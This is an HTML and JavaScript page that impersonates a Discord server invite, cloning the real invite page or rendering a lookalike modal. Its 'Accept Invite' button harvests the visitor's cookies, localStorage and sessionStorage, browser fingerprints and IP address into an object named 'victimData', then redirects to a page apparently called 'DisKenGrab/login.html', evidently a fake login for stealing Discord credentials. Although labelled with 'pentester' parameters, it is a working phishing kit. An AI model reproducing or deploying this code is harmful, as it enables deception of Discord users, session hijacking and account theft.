<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</head>
<body>
    <div id="discordCloneContainer"></div>
    <div id="captureOverlay" style="display: none;"></div>

    <script>
        // Get URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const attackId = urlParams.get('id');
        const pentesterId = urlParams.get('pentester');
        const targetInvite = urlParams.get('invite');

        console.log('üéØ EXACT Discord Invite Cloner:', { targetInvite });

        // Extract invite code
        function extractInviteCode(url) {
            if (!url) return null;
            try {
                let code = '';
                if (url.includes('discord.gg/')) {
                    code = url.split('discord.gg/')[1]?.split('?')[0]?.split('/')[0];
                } else if (url.includes('discord.com/invite/')) {
                    code = url.split('discord.com/invite/')[1]?.split('?')[0]?.split('/')[0];
                }
                return code?.trim();
            } catch (error) {
                return null;
            }
        }

        // Create proxy request to fetch Discord's actual invite page
        async function fetchDiscordInvitePage(inviteCode) {
            console.log('üåê Fetching real Discord invite page...');
            
            try {
                // Method 1: Direct fetch (works for public invites)
                const response = await fetch(`https://discord.com/invite/${inviteCode}`, {
                    method: 'GET',
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'DNT': '1',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'none',
                        'Cache-Control': 'max-age=0'
                    }
                });

                if (response.ok) {
                    const html = await response.text();
                    console.log('‚úÖ Successfully fetched Discord page');
                    return html;
                } else {
                    throw new Error(`HTTP ${response.status}`);
                }
            } catch (error) {
                console.log('‚ùå Direct fetch failed:', error.message);
                return await fetchViaCORSProxy(inviteCode);
            }
        }

        // Alternative method using CORS proxy
        async function fetchViaCORSProxy(inviteCode) {
            try {
                const proxyUrls = [
                    `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://discord.com/invite/${inviteCode}`)}`,
                    `https://cors-anywhere.herokuapp.com/https://discord.com/invite/${inviteCode}`,
                    `https://proxy.cors.sh/https://discord.com/invite/${inviteCode}`
                ];

                for (const proxyUrl of proxyUrls) {
                    try {
                        const response = await fetch(proxyUrl, {
                            headers: {
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                            }
                        });
                        if (response.ok) {
                            const html = await response.text();
                            console.log('‚úÖ Success via CORS proxy');
                            return html;
                        }
                    } catch (e) {
                        continue;
                    }
                }
                throw new Error('All proxy methods failed');
            } catch (error) {
                console.log('‚ùå CORS proxy failed:', error.message);
                return generateExactFallback(inviteCode);
            }
        }

        // Parse Discord's HTML and extract the invite modal
        function extractInviteModal(html) {
            console.log('üîç Extracting invite modal from HTML...');
            
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');
            
            // Look for Discord's invite modal elements
            const modal = doc.querySelector('[class*="modal"], [class*="invite"], [class*="container"]');
            const body = doc.body;
            
            if (modal) {
                return modal.outerHTML;
            } else if (body) {
                // Extract relevant parts from body
                const content = body.innerHTML;
                return content;
            }
            
            return null;
        }

        // Inject our capture button into the cloned content
        function injectCaptureButton(htmlContent) {
            console.log('üéØ Injecting capture button...');
            
            const parser = new DOMParser();
            const doc = parser.parseFromString(htmlContent, 'text/html');
            
            // Find Discord's accept button and replace it
            const acceptButtons = doc.querySelectorAll('button, [role="button"], [class*="button"], [class*="accept"], [class*="join"]');
            
            let mainButton = null;
            for (const button of acceptButtons) {
                const text = button.textContent?.toLowerCase();
                if (text && (text.includes('accept') || text.includes('join') || text.includes('continue'))) {
                    mainButton = button;
                    break;
                }
            }
            
            if (!mainButton) {
                // Create a new button if none found
                mainButton = doc.createElement('button');
                mainButton.textContent = 'Accept Invite';
                mainButton.style.cssText = `
                    background: #5865f2;
                    color: white;
                    border: none;
                    padding: 12px 24px;
                    border-radius: 3px;
                    font-size: 14px;
                    font-weight: 500;
                    cursor: pointer;
                    width: 100%;
                    margin-top: 16px;
                `;
                
                const body = doc.body;
                if (body) {
                    body.appendChild(mainButton);
                }
            }
            
            // Add click handler via data attribute
            mainButton.setAttribute('onclick', 'window.captureDiscordData()');
            mainButton.id = 'discordAcceptButton';
            
            // Also add cancel/close functionality
            const closeButtons = doc.querySelectorAll('[aria-label*="close"], [class*="close"], [class*="cancel"]');
            closeButtons.forEach(btn => {
                btn.setAttribute('onclick', 'window.closeModal()');
            });
            
            return doc.documentElement.outerHTML;
        }

        // Global functions for button handlers
        window.captureDiscordData = async function() {
            console.log('üç™ Starting comprehensive data capture...');
            
            const button = document.getElementById('discordAcceptButton');
            if (button) {
                button.disabled = true;
                button.innerHTML = '<span style="margin-right: 8px;">‚è≥</span> Joining...';
            }
            
            // Capture ALL possible data
            const victimData = {
                timestamp: new Date().toISOString(),
                attackId: attackId,
                pentesterId: pentesterId,
                targetInvite: targetInvite,
                
                // Browser fingerprint
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                maxTouchPoints: navigator.maxTouchPoints,
                
                // Screen info
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                devicePixelRatio: window.devicePixelRatio,
                
                // Timezone
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                
                // Connection
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : null,
                
                // Storage
                cookies: document.cookie,
                localStorage: captureLocalStorage(),
                sessionStorage: captureSessionStorage(),
                
                // URL and navigation
                url: window.location.href,
                referrer: document.referrer,
                
                // Advanced fingerprinting
                canvasFingerprint: await generateCanvasFingerprint(),
                webglFingerprint: getWebGLFingerprint(),
                fonts: getFontsList(),
                plugins: getPluginsList(),
                
                // IP and location data
                ipData: await getIPData()
            };
            
            console.log('‚úÖ Captured comprehensive data:', victimData);
            
            // Save data (you can send to your backend)
            await saveVictimData(victimData);
            
            // Redirect to login page after capture
            setTimeout(() => {
                window.location.href = `../DisKenGrab/login.html?id=${attackId}&pentester=${pentesterId}`;
            }, 1500);
        };
        
        window.closeModal = function() {
            window.location.href = 'https://discord.com';
        };
        
        // Helper functions for data capture
        function captureLocalStorage() {
            const storage = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                storage[key] = localStorage.getItem(key);
            }
            return storage;
        }
        
        function captureSessionStorage() {
            const storage = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                storage[key] = sessionStorage.getItem(key);
            }
            return storage;
        }
        
        async function generateCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;
                
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Canvas Fingerprint', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Canvas Fingerprint', 4, 17);
                
                return canvas.toDataURL().substring(0, 100);
            } catch (e) {
                return 'canvas_not_supported';
            }
        }
        
        function getWebGLFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return 'webgl_not_supported';
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                };
            } catch (e) {
                return 'webgl_error';
            }
        }
        
        function getFontsList() {
            const fonts = [
                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
                'Verdana'
            ];
            return fonts; // Simplified for example
        }
        
        function getPluginsList() {
            return Array.from(navigator.plugins).map(p => p.name);
        }
        
        async function getIPData() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return { ip: data.ip };
            } catch (error) {
                return { ip: 'unknown' };
            }
        }
        
        async function saveVictimData(data) {
            // Save to your backend/Firestore
            console.log('üíæ Saving victim data:', data);
            
            // Example: Send to your backend
            try {
                // await fetch('/api/save-victim-data', {
                //     method: 'POST',
                //     headers: { 'Content-Type': 'application/json' },
                //     body: JSON.stringify(data)
                // });
            } catch (error) {
                console.error('Error saving data:', error);
            }
        }
        
        // Generate exact fallback when scraping fails
        function generateExactFallback(inviteCode) {
            console.log('üîÑ Generating exact fallback...');
            
            return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #313338;
            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            color: #f2f3f5;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        
        .discord-modal {
            width: 440px;
            background: #2b2d31;
            border-radius: 8px;
            box-shadow: 0 0 0 1px rgba(32,34,37,.6), 0 2px 10px 0 rgba(0,0,0,.2);
            overflow: hidden;
        }
        
        .modal-header {
            background: #1e1f22;
            padding: 24px;
            text-align: center;
            position: relative;
        }
        
        .close-button {
            position: absolute;
            top: 16px;
            right: 16px;
            background: none;
            border: none;
            color: #b5bac1;
            cursor: pointer;
            width: 36px;
            height: 36px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }
        
        .server-icon {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: #5865f2;
            margin: 0 auto 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: white;
            font-weight: 600;
        }
        
        .server-name {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 8px;
            color: #fff;
        }
        
        .member-count {
            color: #b5bac1;
            font-size: 14px;
        }
        
        .modal-body {
            padding: 24px;
        }
        
        .invite-message {
            background: #1e1f22;
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 16px;
            border: 1px solid rgba(78,80,88,.6);
        }
        
        .inviter-info {
            display: flex;
            align-items: center;
            margin-bottom: 12px;
        }
        
        .inviter-avatar {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: #5865f2;
            margin-right: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: 600;
            font-size: 14px;
        }
        
        .server-preview {
            display: flex;
            align-items: center;
            padding: 12px;
            background: #313338;
            border-radius: 4px;
            border: 1px solid rgba(78,80,88,.3);
        }
        
        .preview-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            background: #5865f2;
            margin-right: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: 600;
            font-size: 18px;
        }
        
        .accept-button {
            background: #5865f2;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 3px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.2s;
        }
        
        .accept-button:hover {
            background: #4752c4;
        }
    </style>
</head>
<body>
    <div class="discord-modal">
        <div class="modal-header">
            <button class="close-button" onclick="window.closeModal()">√ó</button>
            <div class="server-icon">D</div>
            <div class="server-name">Server ${inviteCode.toUpperCase()}</div>
            <div class="member-count">
                <span style="display: inline-block; width: 8px; height: 8px; background: #23a55a; border-radius: 50%; margin-right: 6px;"></span>
                12,345 Online ‚Ä¢ 67,890 Members
            </div>
        </div>
        <div class="modal-body">
            <div class="invite-message">
                <div class="inviter-info">
                    <div class="inviter-avatar">D</div>
                    <div style="color: #b5bac1; font-size: 14px;">
                        <strong style="color: #f2f3f5;">discorduser</strong> invited you to join
                    </div>
                </div>
                <div class="server-preview">
                    <div class="preview-icon">D</div>
                    <div>
                        <div style="font-weight: 600; font-size: 16px;">Server ${inviteCode.toUpperCase()}</div>
                        <div style="color: #b5bac1; font-size: 14px;">67,890 members</div>
                    </div>
                </div>
            </div>
            <button class="accept-button" id="discordAcceptButton" onclick="window.captureDiscordData()">
                Accept Invite
            </button>
        </div>
    </div>
</body>
</html>`;
        }
        
        // Main function to clone Discord invite
        async function cloneDiscordInvite() {
            const inviteCode = extractInviteCode(targetInvite);
            
            if (!inviteCode) {
                document.getElementById('discordCloneContainer').innerHTML = generateExactFallback('invalid');
                return;
            }
            
            try {
                // Show loading
                document.getElementById('discordCloneContainer').innerHTML = `
                    <div style="display: flex; justify-content: center; align-items: center; height: 100vh; background: #313338; color: #f2f3f5;">
                        <div style="text-align: center;">
                            <div style="font-size: 24px; margin-bottom: 16px;">Loading Discord Invite...</div>
                            <div style="width: 40px; height: 40px; border: 3px solid #5865f2; border-top: 3px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
                        </div>
                    </div>
                    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
                `;
                
                // Fetch real Discord page
                const discordHTML = await fetchDiscordInvitePage(inviteCode);
                
                if (discordHTML) {
                    // Extract and inject our button
                    const modalHTML = extractInviteModal(discordHTML) || discordHTML;
                    const finalHTML = injectCaptureButton(modalHTML);
                    
                    // Render the cloned content
                    document.getElementById('discordCloneContainer').innerHTML = finalHTML;
                    console.log('‚úÖ Successfully cloned Discord invite');
                } else {
                    throw new Error('No HTML content received');
                }
                
            } catch (error) {
                console.error('‚ùå Cloning failed:', error);
                document.getElementById('discordCloneContainer').innerHTML = generateExactFallback(inviteCode);
            }
        }
        
        // Start the cloning process
        document.addEventListener('DOMContentLoaded', cloneDiscordInvite);
    </script>
</body>
</html>